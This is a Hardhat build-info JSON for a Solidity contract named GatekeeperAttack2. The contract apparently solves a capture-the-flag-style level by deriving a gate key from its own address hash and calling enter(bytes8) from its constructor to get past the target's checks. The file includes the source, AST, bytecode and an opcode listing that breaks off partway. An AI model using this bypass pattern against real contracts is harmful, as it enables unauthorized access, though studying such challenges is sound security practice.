{"id":"94a0dff1d3579c43b07b7247c5f0c291","_format":"hh-sol-build-info-1","solcVersion":"0.8.12","solcLongVersion":"0.8.12+commit.f00d7308","input":{"language":"Solidity","sources":{"contracts/attacks/GatekeeperAttack2.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract GatekeeperAttack2 {\n    constructor(address _gatekeeper) {\n        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (type(uint64).max));\n\n        (bool success, ) = _gatekeeper.call(abi.encodeWithSignature(\"enter(bytes8)\", _gateKey));\n    }\n}\n  \n"}},"settings":{"optimizer":{"enabled":true,"runs":1000},"outputSelection":{"*":{"*":["abi","evm.bytecode","evm.deployedBytecode","evm.methodIdentifiers","metadata"],"":["ast"]}}}},"output":{"errors":[{"component":"general","errorCode":"2072","formattedMessage":"Warning: Unused local variable.\n --> contracts/attacks/GatekeeperAttack2.sol:8:10:\n  |\n8 |         (bool success, ) = _gatekeeper.call(abi.encodeWithSignature(\"enter(bytes8)\", _gateKey));\n  |          ^^^^^^^^^^^^\n\n","message":"Unused local variable.","severity":"warning","sourceLocation":{"end":262,"file":"contracts/attacks/GatekeeperAttack2.sol","start":250},"type":"Warning"}],"sources":{"contracts/attacks/GatekeeperAttack2.sol":{"ast":{"absolutePath":"contracts/attacks/GatekeeperAttack2.sol","exportedSymbols":{"GatekeeperAttack2":[47]},"id":48,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1,"literals":["solidity","^","0.8",".0"],"nodeType":"PragmaDirective","src":"32:23:0"},{"abstract":false,"baseContracts":[],"canonicalName":"GatekeeperAttack2","contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"id":47,"linearizedBaseContracts":[47],"name":"GatekeeperAttack2","nameLocation":"66:17:0","nodeType":"ContractDefinition","nodes":[{"body":{"id":45,"nodeType":"Block","src":"123:220:0","statements":[{"assignments":[7],"declarations":[{"constant":false,"id":7,"mutability":"mutable","name":"_gateKey","nameLocation":"140:8:0","nodeType":"VariableDeclaration","scope":45,"src":"133:15:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes8","typeString":"bytes8"},"typeName":{"id":6,"name":"bytes8","nodeType":"ElementaryTypeName","src":"133:6:0","typeDescriptions":{"typeIdentifier":"t_bytes8","typeString":"bytes8"}},"visibility":"internal"}],"id":33,"initialValue":{"arguments":[{"commonType":{"typeIdentifier":"t_uint64","typeString":"uint64"},"id":31,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"arguments":[{"arguments":[{"arguments":[{"arguments":[{"id":19,"name":"this","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-28,"src":"207:4:0","typeDescriptions":{"typeIdentifier":"t_contract$_GatekeeperAttack2_$47","typeString":"contract GatekeeperAttack2"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_GatekeeperAttack2_$47","typeString":"contract GatekeeperAttack2"}],"id":18,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"199:7:0","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":17,"name":"address","nodeType":"ElementaryTypeName","src":"199:7:0","typeDescriptions":{}}},"id":20,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"199:13:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"expression":{"id":15,"name":"abi","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-1,"src":"182:3:0","typeDescriptions":{"typeIdentifier":"t_magic_abi","typeString":"abi"}},"id":16,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"encodePacked","nodeType":"MemberAccess","src":"182:16:0","typeDescriptions":{"typeIdentifier":"t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$","typeString":"function () pure returns (bytes memory)"}},"id":21,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"182:31:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":14,"name":"keccak256","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-8,"src":"172:9:0","typeDescriptions":{"typeIdentifier":"t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$","typeString":"function (bytes memory) pure returns (bytes32)"}},"id":22,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"172:42:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":13,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"165:6:0","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes8_$","typeString":"type(bytes8)"},"typeName":{"id":12,"name":"bytes8","nodeType":"ElementaryTypeName","src":"165:6:0","typeDescriptions":{}}},"id":23,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"165:50:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes8","typeString":"bytes8"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes8","typeString":"bytes8"}],"id":11,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"158:6:0","typeDescriptions":{"typeIdentifier":"t_type$_t_uint64_$","typeString":"type(uint64)"},"typeName":{"id":10,"name":"uint64","nodeType":"ElementaryTypeName","src":"158:6:0","typeDescriptions":{}}},"id":24,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"158:58:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint64","typeString":"uint64"}},"nodeType":"BinaryOperation","operator":"^","rightExpression":{"components":[{"expression":{"arguments":[{"id":27,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"225:6:0","typeDescriptions":{"typeIdentifier":"t_type$_t_uint64_$","typeString":"type(uint64)"},"typeName":{"id":26,"name":"uint64","nodeType":"ElementaryTypeName","src":"225:6:0","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint64_$","typeString":"type(uint64)"}],"id":25,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"220:4:0","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":28,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"220:12:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint64","typeString":"type(uint64)"}},"id":29,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"max","nodeType":"MemberAccess","src":"220:16:0","typeDescriptions":{"typeIdentifier":"t_uint64","typeString":"uint64"}}],"id":30,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"219:18:0","typeDescriptions":{"typeIdentifier":"t_uint64","typeString":"uint64"}},"src":"158:79:0","typeDescriptions":{"typeIdentifier":"t_uint64","typeString":"uint64"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint64","typeString":"uint64"}],"id":9,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"151:6:0","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes8_$","typeString":"type(bytes8)"},"typeName":{"id":8,"name":"bytes8","nodeType":"ElementaryTypeName","src":"151:6:0","typeDescriptions":{}}},"id":32,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"151:87:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes8","typeString":"bytes8"}},"nodeType":"VariableDeclarationStatement","src":"133:105:0"},{"assignments":[35,null],"declarations":[{"constant":false,"id":35,"mutability":"mutable","name":"success","nameLocation":"255:7:0","nodeType":"VariableDeclaration","scope":45,"src":"250:12:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":34,"name":"bool","nodeType":"ElementaryTypeName","src":"250:4:0","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},null],"id":44,"initialValue":{"arguments":[{"arguments":[{"hexValue":"656e7465722862797465733829","id":40,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"309:15:0","typeDescriptions":{"typeIdentifier":"t_stringliteral_3370204ec98aba7f6a7e6f8e1821e3e93ed448423cd937e26bb3635897d85768","typeString":"literal_string \"enter(bytes8)\""},"value":"enter(bytes8)"},{"id":41,"name":"_gateKey","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":7,"src":"326:8:0","typeDescriptions":{"typeIdentifier":"t_bytes8","typeString":"bytes8"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_3370204ec98aba7f6a7e6f8e1821e3e93ed448423cd937e26bb3635897d85768","typeString":"literal_string \"enter(bytes8)\""},{"typeIdentifier":"t_bytes8","typeString":"bytes8"}],"expression":{"id":38,"name":"abi","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-1,"src":"285:3:0","typeDescriptions":{"typeIdentifier":"t_magic_abi","typeString":"abi"}},"id":39,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"encodeWithSignature","nodeType":"MemberAccess","src":"285:23:0","typeDescriptions":{"typeIdentifier":"t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$","typeString":"function (string memory) pure returns (bytes memory)"}},"id":42,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"285:50:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"expression":{"id":36,"name":"_gatekeeper","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3,"src":"268:11:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":37,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"call","nodeType":"MemberAccess","src":"268:16:0","typeDescriptions":{"typeIdentifier":"t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$","typeString":"function (bytes memory) payable returns (bool,bytes memory)"}},"id":43,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"268:68:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_bytes_memory_ptr_$","typeString":"tuple(bool,bytes memory)"}},"nodeType":"VariableDeclarationStatement","src":"249:87:0"}]},"id":46,"implemented":true,"kind":"constructor","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":4,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3,"mutability":"mutable","name":"_gatekeeper","nameLocation":"110:11:0","nodeType":"VariableDeclaration","scope":46,"src":"102:19:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2,"name":"address","nodeType":"ElementaryTypeName","src":"102:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"101:21:0"},"returnParameters":{"id":5,"nodeType":"ParameterList","parameters":[],"src":"123:0:0"},"scope":47,"src":"90:253:0","stateMutability":"nonpayable","virtual":false,"visibility":"public"}],"scope":48,"src":"57:288:0","usedErrors":[]}],"src":"32:317:0"},"id":0}},"contracts":{"contracts/attacks/GatekeeperAttack2.sol":{"GatekeeperAttack2":{"abi":[{"inputs":[{"internalType":"address","name":"_gatekeeper","type":"address"}],"stateMutability":"nonpayable","type":"constructor"}],"evm":{"bytecode":{"functionDebugData":{"@_46":{"entryPoint":null,"id":46,"parameterSlots":1,"returnSlots":0},"abi_decode_tuple_t_address_fromMemory":{"entryPoint":291,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_packed_t_address__to_t_address__nonPadded_inplace_fromStack_reversed":{"entryPoint":null,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed":{"entryPoint":339,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_bytes8__to_t_bytes8__fromStack_reversed":{"entryPoint":null,"id":null,"parameterSlots":2,"returnSlots":1}},"generatedSources":[{"ast":{"nodeType":"YulBlock","src":"0:1174:1","statements":[{"nodeType":"YulBlock","src":"6:3:1","statements":[]},{"body":{"nodeType":"YulBlock","src":"95:209:1","statements":[{"body":{"nodeType":"YulBlock","src":"141:16:1","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"150:1:1","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"153:1:1","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"143:6:1"},"nodeType":"YulFunctionCall","src":"143:12:1"},"nodeType":"YulExpressionStatement","src":"143:12:1"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"116:7:1"},{"name":"headStart","nodeType":"YulIdentifier","src":"125:9:1"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"112:3:1"},"nodeType":"YulFunctionCall","src":"112:23:1"},{"kind":"number","nodeType":"YulLiteral","src":"137:2:1","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"108:3:1"},"nodeType":"YulFunctionCall","src":"108:32:1"},"nodeType":"YulIf","src":"105:52:1"},{"nodeType":"YulVariableDeclaration","src":"166:29:1","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"185:9:1"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"179:5:1"},"nodeType":"YulFunctionCall","src":"179:16:1"},"variables":[{"name":"value","nodeType":"YulTypedName","src":"170:5:1","type":""}]},{"body":{"nodeType":"YulBlock","src":"258:16:1","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"267:1:1","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"270:1:1","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"260:6:1"},"nodeType":"YulFunctionCall","src":"260:12:1"},"nodeType":"YulExpressionStatement","src":"260:12:1"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"217:5:1"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"228:5:1"},{"arguments":[{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"243:3:1","type":"","value":"160"},{"kind":"number","nodeType":"YulLiteral","src":"248:1:1","type":"","value":"1"}],"functionName":{"name":"shl","nodeType":"YulIdentifier","src":"239:3:1"},"nodeType":"YulFunctionCall","src":"239:11:1"},{"kind":"number","nodeType":"YulLiteral","src":"252:1:1","type":"","value":"1"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"235:3:1"},"nodeType":"YulFunctionCall","src":"235:19:1"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"224:3:1"},"nodeType":"YulFunctionCall","src":"224:31:1"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"214:2:1"},"nodeType":"YulFunctionCall","src":"214:42:1"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"207:6:1"},"nodeType":"YulFunctionCall","src":"207:50:1"},"nodeType":"YulIf","src":"204:70:1"},{"nodeType":"YulAssignment","src":"283:15:1","value":{"name":"value","nodeType":"YulIdentifier","src":"293:5:1"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"283:6:1"}]}]},"name":"abi_decode_tuple_t_address_fromMemory","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"61:9:1","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"72:7:1","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"84:6:1","type":""}],"src":"14:290:1"},{"body":{"nodeType":"YulBlock","src":"428:102:1","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"445:3:1"},{"arguments":[{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"458:2:1","type":"","value":"96"},{"name":"value0","nodeType":"YulIdentifier","src":"462:6:1"}],"functionName":{"name":"shl","nodeType":"YulIdentifier","src":"454:3:1"},"nodeType":"YulFunctionCall","src":"454:15:1"},{"arguments":[{"arguments":[{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"483:2:1","type":"","value":"96"},{"kind":"number","nodeType":"YulLiteral","src":"487:1:1","type":"","value":"1"}],"functionName":{"name":"shl","nodeType":"YulIdentifier","src":"479:3:1"},"nodeType":"YulFunctionCall","src":"479:10:1"},{"kind":"number","nodeType":"YulLiteral","src":"491:1:1","type":"","value":"1"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"475:3:1"},"nodeType":"YulFunctionCall","src":"475:18:1"}],"functionName":{"name":"not","nodeType":"YulIdentifier","src":"471:3:1"},"nodeType":"YulFunctionCall","src":"471:23:1"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"450:3:1"},"nodeType":"YulFunctionCall","src":"450:45:1"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"438:6:1"},"nodeType":"YulFunctionCall","src":"438:58:1"},"nodeType":"YulExpressionStatement","src":"438:58:1"},{"nodeType":"YulAssignment","src":"505:19:1","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"516:3:1"},{"kind":"number","nodeType":"YulLiteral","src":"521:2:1","type":"","value":"20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"512:3:1"},"nodeType":"YulFunctionCall","src":"512:12:1"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"505:3:1"}]}]},"name":"abi_encode_tuple_packed_t_address__to_t_address__nonPadded_inplace_fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"404:3:1","type":""},{"name":"value0","nodeType":"YulTypedName","src":"409:6:1","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"420:3:1","type":""}],"src":"309:221:1"},{"body":{"nodeType":"YulBlock","src":"634:107:1","statements":[{"nodeType":"YulAssignment","src":"644:26:1","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"656:9:1"},{"kind":"number","nodeType":"YulLiteral","src":"667:2:1","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"652:3:1"},"nodeType":"YulFunctionCall","src":"652:18:1"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"644:4:1"}]},{"expression":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"686:9:1"},{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"701:6:1"},{"arguments":[{"arguments":[{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"721:3:1","type":"","value":"192"},{"kind":"number","nodeType":"YulLiteral","src":"726:1:1","type":"","value":"1"}],"functionName":{"name":"shl","nodeType":"YulIdentifier","src":"717:3:1"},"nodeType":"YulFunctionCall","src":"717:11:1"},{"kind":"number","nodeType":"YulLiteral","src":"730:1:1","type":"","value":"1"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"713:3:1"},"nodeType":"YulFunctionCall","src":"713:19:1"}],"functionName":{"name":"not","nodeType":"YulIdentifier","src":"709:3:1"},"nodeType":"YulFunctionCall","src":"709:24:1"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"697:3:1"},"nodeType":"YulFunctionCall","src":"697:37:1"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"679:6:1"},"nodeType":"YulFunctionCall","src":"679:56:1"},"nodeType":"YulExpressionStatement","src":"679:56:1"}]},"name":"abi_encode_tuple_t_bytes8__to_t_bytes8__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"603:9:1","type":""},{"name":"value0","nodeType":"YulTypedName","src":"614:6:1","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"625:4:1","type":""}],"src":"535:206:1"},{"body":{"nodeType":"YulBlock","src":"883:289:1","statements":[{"nodeType":"YulVariableDeclaration","src":"893:27:1","value":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"913:6:1"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"907:5:1"},"nodeType":"YulFunctionCall","src":"907:13:1"},"variables":[{"name":"length","nodeType":"YulTypedName","src":"897:6:1","type":""}]},{"nodeType":"YulVariableDeclaration","src":"929:10:1","value":{"kind":"number","nodeType":"YulLiteral","src":"938:1:1","type":"","value":"0"},"variables":[{"name":"i","nodeType":"YulTypedName","src":"933:1:1","type":""}]},{"body":{"nodeType":"YulBlock","src":"1000:77:1","statements":[{"expression":{"arguments":[{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"1025:3:1"},{"name":"i","nodeType":"YulIdentifier","src":"1030:1:1"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1021:3:1"},"nodeType":"YulFunctionCall","src":"1021:11:1"},{"arguments":[{"arguments":[{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"1048:6:1"},{"name":"i","nodeType":"YulIdentifier","src":"1056:1:1"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1044:3:1"},"nodeType":"YulFunctionCall","src":"1044:14:1"},{"kind":"number","nodeType":"YulLiteral","src":"1060:4:1","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1040:3:1"},"nodeType":"YulFunctionCall","src":"1040:25:1"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"1034:5:1"},"nodeType":"YulFunctionCall","src":"1034:32:1"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"1014:6:1"},"nodeType":"YulFunctionCall","src":"1014:53:1"},"nodeType":"YulExpressionStatement","src":"1014:53:1"}]},"condition":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"959:1:1"},{"name":"length","nodeType":"YulIdentifier","src":"962:6:1"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"956:2:1"},"nodeType":"YulFunctionCall","src":"956:13:1"},"nodeType":"YulForLoop","post":{"nodeType":"YulBlock","src":"970:21:1","statements":[{"nodeType":"YulAssignment","src":"972:17:1","value":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"981:1:1"},{"kind":"number","nodeType":"YulLiteral","src":"984:4:1","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"977:3:1"},"nodeType":"YulFunctionCall","src":"977:12:1"},"variableNames":[{"name":"i","nodeType":"YulIdentifier","src":"972:1:1"}]}]},"pre":{"nodeType":"YulBlock","src":"952:3:1","statements":[]},"src":"948:129:1"},{"body":{"nodeType":"YulBlock","src":"1103:31:1","statements":[{"expression":{"arguments":[{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"1116:3:1"},{"name":"length","nodeType":"YulIdentifier","src":"1121:6:1"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1112:3:1"},"nodeType":"YulFunctionCall","src":"1112:16:1"},{"kind":"number","nodeType":"YulLiteral","src":"1130:1:1","type":"","value":"0"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"1105:6:1"},"nodeType":"YulFunctionCall","src":"1105:27:1"},"nodeType":"YulExpressionStatement","src":"1105:27:1"}]},"condition":{"arguments":[{"name":"i","nodeType":"YulIdentifier","src":"1092:1:1"},{"name":"length","nodeType":"YulIdentifier","src":"1095:6:1"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"1089:2:1"},"nodeType":"YulFunctionCall","src":"1089:13:1"},"nodeType":"YulIf","src":"1086:48:1"},{"nodeType":"YulAssignment","src":"1143:23:1","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"1154:3:1"},{"name":"length","nodeType":"YulIdentifier","src":"1159:6:1"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1150:3:1"},"nodeType":"YulFunctionCall","src":"1150:16:1"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"1143:3:1"}]}]},"name":"abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"859:3:1","type":""},{"name":"value0","nodeType":"YulTypedName","src":"864:6:1","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"875:3:1","type":""}],"src":"746:426:1"}]},"contents":"{\n    { }\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0\n    {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n        let value := mload(headStart)\n        if iszero(eq(value, and(value, sub(shl(160, 1), 1)))) { revert(0, 0) }\n        value0 := value\n    }\n    function abi_encode_tuple_packed_t_address__to_t_address__nonPadded_inplace_fromStack_reversed(pos, value0) -> end\n    {\n        mstore(pos, and(shl(96, value0), not(sub(shl(96, 1), 1))))\n        end := add(pos, 20)\n    }\n    function abi_encode_tuple_t_bytes8__to_t_bytes8__fromStack_reversed(headStart, value0) -> tail\n    {\n        tail := add(headStart, 32)\n        mstore(headStart, and(value0, not(sub(shl(192, 1), 1))))\n    }\n    function abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos, value0) -> end\n    {\n        let length := mload(value0)\n        let i := 0\n        for { } lt(i, length) { i := add(i, 0x20) }\n        {\n            mstore(add(pos, i), mload(add(add(value0, i), 0x20)))\n        }\n        if gt(i, length) { mstore(add(pos, length), 0) }\n        end := add(pos, length)\n    }\n}","id":1,"language":"Yul","name":"#utility.yul"}],"linkReferences":{},"object":"608060405234801561001057600080fd5b506040516101db3803806101db83398101604081905261002f91610123565b6040516001600160601b03193060601b1660208201526000906001600160401b03906034016040516020818303038152906040528051906020012060c01c1860c01b90506000826001600160a01b0316826040516024016100a091906001600160c01b031991909116815260200190565b60408051601f198184030181529181526020820180516001600160e01b03166319b8102760e11b179052516100d59190610153565b6000604051808303816000865af19150503d8060008114610112576040519150601f19603f3d011682016040523d82523d6000602084013e610117565b606091505b5050905050505061018e565b60006020828403121561013557600080fd5b81516001600160a01b038116811461014c57600080fd5b9392505050565b6000825160005b81811015610174576020818601810151858301520161015a565b81811115610183576000828501525b509190910192915050565b603f8061019c6000396000f3fe6080604052600080fdfea2646970667358221220da083a8d9c7477daee89010dc5ece77608fdfbadeaa869d307188c74bdae42af64736f6c634300080c0033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x1DB CODESIZE SUB DUP1 PUSH2 0x1DB DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH2 0x2F SWAP2 PUSH2 0x123 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x60 SHL SUB NOT ADDRESS PUSH1 0x60 SHL AND PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0x0 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x40 SHL SUB SWAP1 PUSH1 0x34 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 PUSH1 0xC0 SHR XOR PUSH1 0xC0 SHL SWAP1 POP PUSH1 0x0 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP3 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0xA0 SWAP2 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xC0 SHL SUB NOT SWAP2 SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1F NOT DUP2 DUP5 SUB ADD DUP2 MSTORE SWAP2 DUP2 MSTORE PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0x19B81027 PUSH1 0xE1 SHL OR SWAP1 MSTORE MLOAD PUSH2 0xD5 SWAP2 SWAP1 PUSH2 0x153 